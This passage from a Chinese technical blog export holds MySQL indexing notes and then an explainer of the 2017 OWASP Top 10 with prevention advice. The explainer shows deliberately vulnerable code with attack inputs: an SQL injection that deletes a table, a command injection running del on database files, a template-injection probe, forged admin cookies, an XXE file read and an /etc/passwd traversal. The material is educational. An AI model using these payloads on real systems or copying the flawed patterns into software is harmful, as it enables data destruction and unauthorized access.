<p>非叶子节点相当于是叶子节点的索引，也叫 <strong>稀疏索引</strong>，叶子节点相当于是存储（关键字）数据的数据层</p>
<p>B+数对于B数的优势</p>
<ul>
<li>单一节点存储的元素多，使得查询的IO次数更少，适合做MySQL的底层数据结构</li>
<li>所有查询都要查到叶子节点，查询性能稳定</li>
<li>所有叶子节点形成一个有序的链表，便于查找</li>
</ul>
<h4 id="哈希索引"><a href="#哈希索引" class="headerlink" title="哈希索引"></a>哈希索引</h4><p>只有精确匹配索引所有列的查询才有效。每行数据存储引擎都会对所有的索引列计算一个哈希码，哈希索引将哈希码存储在索引中，同时在哈希表中保存指向每个数据行的指针。因为索引自身只存储对应的哈希值，所以索引的结构十分紧凑，哈希索引查找的速度非常快。但是</p>
<ul>
<li>不按照索引顺序存储，无法用于排序</li>
<li>不支持部分索引查找匹配</li>
<li>不支持范围查找</li>
</ul>
<h4 id="聚集索引"><a href="#聚集索引" class="headerlink" title="聚集索引"></a>聚集索引</h4><p>由B+树实现，一个表只能有一个聚集索引，InnoDB表中聚集索引的索引列就是主键，所以聚集索引也叫主键索引。如下表：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">table</span> Student<span class="token punctuation">(</span>
    id <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token keyword">primary</span> <span class="token keyword">key</span> <span class="token keyword">auto_increment</span><span class="token punctuation">,</span>
    last_name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span> 
    first_name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span> 
    birthday <span class="token keyword">date</span> <span class="token operator">not</span> <span class="token boolean">null</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>聚集索引的结构如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210410161154845.png" alt loading="lazy"></p>
<blockquote>
<p>聚簇索引：索引的叶节点指向数据</p>
<p>非聚簇索引：索引的叶节点指向数据的引用</p>
<p>myisam使用非聚簇索引，innodb使用聚簇索引</p>
</blockquote>
<h4 id="二级索引"><a href="#二级索引" class="headerlink" title="二级索引"></a>二级索引</h4><p>对于InnoDB表，在非主键列的其他列上建的索引就是二级索引（因为聚集索引只有一个）。</p>
<p>在MySQL中主键索引的叶子节点存的是整行数据，而二级索引叶子节点内容是主键的值。</p>
<p>详见：<a href="http://mysql.taobao.org/monthly/2020/01/01/">MySQL · 引擎特性 · 二级索引分析</a></p>
<h3 id="索引优化"><a href="#索引优化" class="headerlink" title="索引优化"></a>索引优化</h3><ul>
<li><p>尽量保证全值匹配，即索引字段和select字段相同且顺序一致</p>
</li>
<li><p>最佳左前缀法则：如果索引多列，则查询要从索引的最左列开始，且中间不跳过索引中的列</p>
</li>
<li><p>不在索引列上做任何操作(计算、函数、类型转换、不要出现隐式转)，会导致索引失效而全表扫描</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">假设目标行 name <span class="token operator">=</span> <span class="token string">'july'</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> name<span class="token operator">=</span><span class="token string">'july'</span><span class="token punctuation">;</span>           <span class="token comment">## 走索引 </span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> <span class="token keyword">left</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'july'</span><span class="token punctuation">;</span>   <span class="token comment">## 不走索引</span></code></pre>
</li>
<li><p>一旦出现非等值字段条件判断，则该字段后的索引列皆失效</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">10</span> <span class="token operator">and</span> b<span class="token operator">=</span><span class="token number">100</span> <span class="token operator">and</span> c<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">;</span>   <span class="token comment">## 全索引  a_b_c  </span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">10</span> <span class="token operator">and</span> b<span class="token operator">></span><span class="token number">100</span> <span class="token operator">and</span> c<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">;</span>   <span class="token comment">## 部分索引 a_b  </span>
<span class="token comment">## 非等值条件包括：in &lt; > != like 等  </span>
<span class="token comment">## 注意：当like 'aaa%' 通配符在右时，仍然能够走全索引  </span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">10</span> <span class="token operator">and</span> b <span class="token operator">like</span> <span class="token string">'100%'</span> <span class="token operator">and</span> c<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">;</span>   <span class="token comment">## 全索引  a_b_c  </span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">10</span> <span class="token operator">and</span> b <span class="token operator">like</span> <span class="token string">'%100'</span> <span class="token operator">and</span> c<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">;</span>   <span class="token comment">## 部分索引 a</span></code></pre>
</li>
<li><p>尽量使用覆盖索引，即查询列为索引列的子集，减少select * 的使用</p>
</li>
<li><p>MySQL在使用不等于(!=或者&lt;&gt;)时无法使用索引，会导致全表扫描</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span>     <span class="token comment">## 走索引  </span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a<span class="token operator">!=</span><span class="token number">100</span><span class="token punctuation">;</span>    <span class="token comment">## 不走索引，全表扫描</span></code></pre>
</li>
<li><p>查询条件为 is NULL 和 is not NULL情况时也无法使用索引</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a <span class="token operator">is</span> <span class="token boolean">null</span><span class="token punctuation">;</span>      <span class="token comment">## 不走索引  </span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> a <span class="token operator">is</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">;</span>  <span class="token comment">## 不走索引 </span></code></pre>
</li>
<li><p>like以通配符开头<code>(&#39;%abc...&#39;)</code>时索引也会失效，变为全表扫描；但通配符结尾依然会走索引，该字段后的索引依然失效</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> name<span class="token punctuation">,</span> age <span class="token keyword">from</span> info <span class="token keyword">where</span> name <span class="token operator">like</span> <span class="token string">"%aaa"</span><span class="token punctuation">;</span>  <span class="token comment">## 索引失效  </span>
<span class="token keyword">select</span> name<span class="token punctuation">,</span> age <span class="token keyword">from</span> info <span class="token keyword">where</span> name <span class="token operator">like</span> <span class="token string">"aaa%"</span><span class="token punctuation">;</span>  <span class="token comment">## 索引有效  </span>
<span class="token comment">## 当业务要求必须使用左通配符时，可使用覆盖索引的方法来避免索引失效  </span>
<span class="token comment">## 在上面例子中即建立联合索引 name_age</span></code></pre>
</li>
<li><p>字符串不加单引号会导致索引失效   原因：隐式转换</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">## id为varchar类型  </span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'2000'</span><span class="token punctuation">;</span>  
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">2000</span><span class="token punctuation">;</span>  <span class="token comment">## 会有隐式类型转换</span></code></pre>
</li>
<li><p>尽量少用or，用它来连接查询条件可能会导致索引失效</p>
</li>
<li><p>group by基本上都需要进行排序，当group by的字段顺序和索引顺序不一致的时候，就会导致临时表的产生，即同时出现 Using temporary 和 Using filesort，因此一定要极力避免</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">## 索引为 A_B_C  </span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> A<span class="token operator">=</span><span class="token number">10</span> <span class="token keyword">group</span> <span class="token keyword">by</span> C<span class="token punctuation">,</span> B<span class="token punctuation">;</span>  <span class="token comment">## 走索引A，产生临时表</span></code></pre>

</li>
</ul>
<p><strong>小结</strong></p>
<ul>
<li>对于单值索引，尽量选择针对当前查询过滤性更好的索引字段</li>
<li>在选择联合索引时，当前查询中过滤性最好的字段在索引字段顺序中位置越靠前越好</li>
<li>在选择联合索引时，尽可能选择可以包含当前查询的where子句中更多字段的索引，即如果可能的话，尽量达到索引覆盖，这样不仅能够避免索引失效，也能够避免回表等影响查询性能等操作</li>
<li>尽可能通过分析统计信息和调整查询语句的写法来达到适应选择的索引</li>
</ul>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
<li><a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-storage-engine.html">The InnoDB Storage Engine</a></li>
<li><a href="https://dev.mysql.com/doc/refman/5.7/en/storage-engines.html">Alternative Storage Engines</a></li>
<li><a href="https://github.com/jaywcjlove/mysql-tutorial/blob/master/chapter3/3.5.md">数据库存储引擎</a></li>
<li><a href="https://juejin.cn/post/6854573221627297800">简单了解InnoDB底层原理</a></li>
<li><a href="https://zq99299.github.io/dsalg-tutorial/dsalg-java-hsp/12/03.html#b-%E6%A0%91">B 树、B+ 树、B*树</a></li>
<li><a href="https://segmentfault.com/a/1190000021488885">为什么mysql索引要使用B+树，而不是B树，红黑树</a></li>
<li><a href="https://juejin.cn/post/6844903919525740552">MySQL索引的原理，B+树、聚集索引和二级索引的结构分析</a></li>
<li><a href="https://segmentfault.com/a/1190000023441683">MySQL优化之索引优化</a></li>
</ol>
]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Owasp_Top_10</title>
    <url>/posts/db657c/</url>
    <content><![CDATA[<p><a href="https://owasp.org/">Owasp</a> 全称 Open Web Application Security Project（开放式Web应用程序安全项目）。</p>
<p>其中最具权威的就是其”十大安全漏洞列表”，目前正式发布的最新版本是2017年11月份发布的。</p>
<p>以下对2017年的Top 10版本做一个归纳，例子中不全的欢迎各位大佬评论指出，后续有会添加上。</p>
<span id="more"></span>

<h3 id="注入（Injection）"><a href="#注入（Injection）" class="headerlink" title="注入（Injection）"></a>注入（Injection）</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>当不可信的数据作为命令或查询语句的一部分被发送给解释器的时候，会发生注入漏洞，包括SQL、NoSQL、OS以及LDAP注入等。攻击者发送的恶意数据可能会诱使解释器执行计划外的命令，或在没有适当授权的情况下访问数据。</p>
<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><h5 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h5><pre class="language-c#" data-language="c#"><code class="language-c#">string userName &#x3D; ctx.getAuthenticatedUserName();
string query &#x3D; &quot;SELECT * FROM items WHERE owner &#x3D; &#39;&quot; + userName + &quot;&#39; AND itemname &#x3D; &#39;&quot; + ItemName.Text + &quot;&#39;&quot;;
sda &#x3D; new SqlDataAdapter(query, conn);
DataTable dt &#x3D; new DataTable();
sda.Fill(dt);</code></pre>

<p>改代码准备执行的查询如下：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> items <span class="token keyword">WHERE</span> owner <span class="token operator">=</span> <span class="token operator">&lt;</span>userName<span class="token operator">></span> <span class="token operator">AND</span> itemname <span class="token operator">=</span> <span class="token operator">&lt;</span>itemName<span class="token operator">></span><span class="token punctuation">;</span></code></pre>

<p>但是查询是通过固定的查询字符和用户的输入字符串连接来动态构成的，若攻击者在<code>owner</code>处构造<code>name&#39;; DELETE FROM items; --</code>，则SQL语句变成了</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> items <span class="token keyword">WHERE</span> owner <span class="token operator">=</span> <span class="token string">'wiley'</span> <span class="token operator">AND</span> itemname <span class="token operator">=</span> <span class="token string">'name'</span><span class="token punctuation">;</span> <span class="token keyword">DELETE</span> <span class="token keyword">FROM</span> items<span class="token punctuation">;</span> <span class="token comment">--'</span></code></pre>

<p>参考：<a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: SQL Injection</a></p>
<p>本站案例：<a href="https://www.extrader.top/posts/e73517db/">CTF-SQL注入</a>，<a href="https://www.extrader.top/posts/e5cd0178/">Sqli-labs靶场</a></p>
<h5 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h5><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> btype <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"backuptype"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"cmd.exe /K \" c:\\util\\rmanDB.bat "</span> <span class="token operator">+</span> btype <span class="token operator">+</span> <span class="token string">"&amp;&amp;c:\\utl\\cleanup.bat\""</span><span class="token punctuation">)</span>
<span class="token class-name">System<span class="token punctuation">.</span>Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>以上代码来自一个管理web的应用程序，改程序旨在允许用户使用批处理文件程序来对Oracle数据库进行备份，然后运行<code>cleanup.bat</code>脚本删除一些临时文件，备份脚本<code>rmanDB.bat</code>接收单个命令参数，该参数指定要执行的备份类型，由于对数据库的访问受到限制，因此该备份脚本通常是以特权用户身份运行的</p>
<p>通常<code>Runtime.exec()</code>函数不会执行多个命令，但是在这种情况下，程序首先运行<code>cmd.exe shell</code>，以便通过一次调用<code>Runtime.exec()</code>来运行多个命令。调用完<code>rmanDB</code>后，接着调用由<code>&amp;&amp;</code>分隔的多个命令。若攻击者传入的字符串形式为<code>&amp; del c:\\dbms\\*.*</code>，那么该应用程序将执行此命令以及攻击者传入的其它命令 <code>del</code></p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//example.com/app/accountView?backuptype=&amp; del c:\\dbms\\*.*</span></span></code></pre>

<p>参考：<a href="https://cwe.mitre.org/data/definitions/77.html">CWE-77: Command Injection</a></p>
<p>本站案例：<a href="https://www.extrader.top/posts/c714e372/">CTF-命令执行</a>，<a href="https://www.extrader.top/posts/45c7e77/">php命令执行小技巧</a></p>
<h5 id="服务器端模板注入（SSTI）"><a href="#服务器端模板注入（SSTI）" class="headerlink" title="服务器端模板注入（SSTI）"></a>服务器端模板注入（SSTI）</h5><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">require_once</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/../lib/Twig/Autoloader.php'</span><span class="token punctuation">;</span>
<span class="token class-name static-context">Twig_Autoloader</span><span class="token operator">::</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$twig</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Twig_Environment</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Twig_Loader_String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$output</span> <span class="token operator">=</span> <span class="token variable">$twig</span><span class="token operator">-></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hello <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 将用户输入作为模版内容的一部分</span>
<span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">;</span></span></code></pre>

<p>该段代码使得用户可以在发送电子邮件之前自定义使用的名称，但是若攻击者不将静态值传递到模板中，而是使用GET参数动态生成模板本身的一部分name，如下所示</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//vulnerable-website.com/?name=IsVuln&#123;# comment #&#125;&#123;&#123;2*8&#125;&#125;OK</span></span></code></pre>

<p>由于 `` 作为 Twig 模板引擎的默认注释形式，所以在前端输出的时候并不会显示，而 <code>&#123;&#123;2*8&#125;&#125;</code> 作为模板变量最终会返回 16 作为其值进行显示，因此前端最终会返回内容 <code>Hello IsVuln16OK</code></p>
<p>参考：<a href="https://portswigger.net/kb/issues/00101080_serversidetemplateinjection">PortSwigger: Server-side template injection</a>，<a href="https://blog.knownsec.com/2015/11/server-side-template-injection-attack-analysis/">服务端模板注入攻击 (SSTI) 之浅析</a></p>
<p>本站案例：<a href="https://www.extrader.top/posts/47d18edd/">CTF-SSTI</a></p>
<h4 id="Prevent"><a href="#Prevent" class="headerlink" title="Prevent"></a>Prevent</h4><ol>
<li>使用安全的API</li>
<li>使用“白名单”对服务器端的输入进行验证</li>
<li>使用特定的转义语法来转义特殊字</li>
<li>在查询中使用LIMIT和其他SQL控件，防止SQL注入的情况下大量泄露记录</li>
</ol>
<p>参考：<a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">A1:2017-Injection</a></p>
<h3 id="失效的身份认证"><a href="#失效的身份认证" class="headerlink" title="失效的身份认证"></a>失效的身份认证</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>通过不规范的使用应用程序的身份认证和会话管理功能，从而使攻击者能够破译密码，密钥或会话令牌，或者暂时或永久的冒充其它用户的身份</p>
<h4 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h4><pre class="language-perl" data-language="perl"><code class="language-perl"><span class="token keyword">my</span> $<span class="token string">q = new CGI;

if ($q->cookie('loggedin') ne "true") &#123;
    if (! AuthenticateUser($q->param('username'), $q->param('password'))) &#123;
    	ExitError("Error: you need to log in first");
    &#125;else &#123;
        # Set loggedin and user cookies.
        $q->cookie(
        -name =</span><span class="token operator">></span> <span class="token string">'loggedin'</span><span class="token punctuation">,</span>
        <span class="token operator">-</span>value <span class="token operator">=></span> <span class="token string">'true'</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>

        $<span class="token string">q->cookie(
        -</span>name <span class="token operator">=></span> <span class="token string">'user'</span><span class="token punctuation">,</span>
        <span class="token operator">-</span>value <span class="token operator">=></span> $<span class="token string">q->param('username')
        );
    &#125;
&#125;

if ($q-</span><span class="token operator">></span>cookie<span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span> <span class="token operator">eq</span> <span class="token string">"Administrator"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	DoAdministratorTasks<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>以上代码旨在确保用户已经登录，如果未登录，则代码将使用用户提供的用户名和密码进行身份验证，如果成功，它将登录用户并将用户的cookie设置为“记住”用户已经登录，最后，如果登录的用户的cookie中具有“管理员”用户名，则代码将执行管理员任务。</p>
<p>然而，这段代码是可以绕过的，攻击者可以独立设置cookie，使得代码不会检查用户名和密码，并且还可以伪造“管理员”身份进行操作，伪造的request头如下：</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/cgi-bin/vulnerable.cgi</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">user=Administrator</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">loggedin=true</span></span></code></pre>

<p>通过将登录的cookie loggedin设置为“true”，攻击者将绕过整个身份认证；通过使cookie user为“Administrator”值，从而获得管理员权限</p>
<p>参考：<a href="https://cwe.mitre.org/data/definitions/287.html">CWE-287: Improper Authentication</a></p>
<h4 id="Prevent-1"><a href="#Prevent-1" class="headerlink" title="Prevent"></a>Prevent</h4><ol>
<li>实施多因素身份认证，以防止自动进行凭据填充，暴力破解和凭据重用攻击</li>
<li>不适用默认密码，弱密码，尤其是对于管理员用户</li>
<li>实施密码检测，限制密码长度，复杂性</li>
<li>限制登录失败次数，频繁的登录尝试，记录故障，并在检测到攻击时提醒管理员</li>
<li>适用服务器端安全的内置会话管理器</li>
</ol>
<p>参考：<a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">A2:2017-Broken Authentication</a></p>
<h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><h4 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h4><p>我们的敏感信息包括密码、财务数据、医疗数据等，由于web应用或者API未加密或不正确的保护敏感数据，这些数据极易遭到攻击者利用，攻击者可能使用这些数据来进行一些犯罪行为，因此，未加密的信息极易遭到破坏和利用，我们应该加强对敏感数据的保护，web应用应该在传输过程中数据、存储的数据以及和浏览器的交互时的数据进行加密，保证数据安全。</p>
<h4 id="Example-2"><a href="#Example-2" class="headerlink" title="Example"></a>Example</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">persistLogin</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"username"</span> <span class="token operator">=></span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"password"</span><span class="token operator">=></span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setcookie</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"userdata"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>此代码将用户的信息写入cookie，因此用户以后不必再次登录</p>
<p>该代码以纯文本的格式将用户的用户名和密码存储在计算机的cookie中，如果攻击者破坏了用户的计算机，则这将公开用户的登录信息，即使用户的计算机没有受到损害，当这种弱点加上跨站点脚本可能使攻击者远程复制cookie</p>
<h4 id="Prevent-2"><a href="#Prevent-2" class="headerlink" title="Prevent"></a>Prevent</h4><ol>
<li>对应用程序处理，存储或传输的数据进行分类。</li>
<li>不存储不必要的敏感数据，尽快将其丢弃</li>
<li>确保对静态的所有敏感数据进行加密，并且使用最新且功能强大的标准算法，协议和密钥</li>
<li>使用安全协议对传输中的所有数据进行加密，如https，hsts</li>
</ol>
<p>参考：<a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">A3:2017-Sensitive Data Exposure</a></p>
<h3 id="XML外部实体（XXE）"><a href="#XML外部实体（XXE）" class="headerlink" title="XML外部实体（XXE）"></a>XML外部实体（XXE）</h3><h4 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h4><p>XXE 全称为XML External Entity attack 即XML<a href="https://baike.baidu.com/item/可扩展标记语言/2885849?fromtitle=xml&fromid=86251&fr=aladdin">(可扩展标记语言)</a> 外部实体注入攻击，早期或配置错误的XML处理器评估了XML文件外部实体引用，攻击者可以利用这个漏洞窃取URI(<a href="https://baike.baidu.com/item/URI/16481812">统一资源标识符</a>)文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施<a href="https://baike.baidu.com/item/拒绝服务攻击/421896?fr=aladdin">拒绝服务攻击</a>。</p>
<h4 id="Example-3"><a href="#Example-3" class="headerlink" title="Example"></a>Example</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xml'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$xml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>
&lt;!ENTITY file SYSTEM "file:///d://flag.txt" >
</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre>

<p>具体参考本站：<a href="https://www.extrader.top/posts/55c267c8/">XXE学习笔记</a></p>
<h4 id="Prevent-3"><a href="#Prevent-3" class="headerlink" title="Prevent"></a>Prevent</h4><ol>
<li>尽可能使用不太复杂的数据格式（如：JSON）避免敏感数据的序列化</li>
<li>修补或升级应用程序或基础操作系统上正在使用的所有XML处理器和库</li>
<li>在应用程序的所有XML解析器中禁用XML外部实体和DTD处理。</li>
<li>在服务器端实施“白名单”输入验证，过滤或清理操作</li>
</ol>
<h3 id="失效的访问控制"><a href="#失效的访问控制" class="headerlink" title="失效的访问控制"></a>失效的访问控制</h3><h4 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h4><p>通过身份验证的用户，可以访问其他用户的相关信息，没有实施恰当的访问权限。攻击者可以利用这个漏洞去查看未授权的功能和数据，例：访问用户的账户、敏感文件、获取和正常用户相同的权限等.</p>
<h4 id="Example-4"><a href="#Example-4" class="headerlink" title="Example"></a>Example</h4><pre class="language-perl" data-language="perl"><code class="language-perl"><span class="token keyword">my</span> <span class="token variable">$dataPath</span> <span class="token operator">=</span> <span class="token string">"/users/cwe/profiles"</span><span class="token punctuation">;</span>
<span class="token keyword">my</span> <span class="token variable">$username</span> <span class="token operator">=</span> param<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">my</span> <span class="token variable">$profilePath</span> <span class="token operator">=</span> <span class="token variable">$dataPath</span> <span class="token operator">.</span> <span class="token string">"/"</span> <span class="token operator">.</span> <span class="token variable">$username</span><span class="token punctuation">;</span>

open<span class="token punctuation">(</span><span class="token keyword">my</span> <span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token string">"&lt;$profilePath"</span><span class="token punctuation">)</span> <span class="token operator">||</span> ExitError<span class="token punctuation">(</span><span class="token string">"profile read error: $profilePath"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">print</span> <span class="token string">"&lt;ul>\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token variable">$fh</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">print</span> <span class="token string">"&lt;li>$_&lt;/li>\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">print</span> <span class="token string">"&lt;/ul>\n"</span><span class="token punctuation">;</span></code></pre>

<p>以上代码可能适用于社交网络应用程序，其中用户的个人资料信息都存储在单独的文件中，所有文件都存储在一个目录中</p>
<p>尽管程序员打算访问“/users/cwe/profiles/alice”之类的文件，但没有验证传入的用户参数。攻击者可能会提供以下字符串：</p>
<pre class="language-none"><code class="language-none">..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</code></pre>

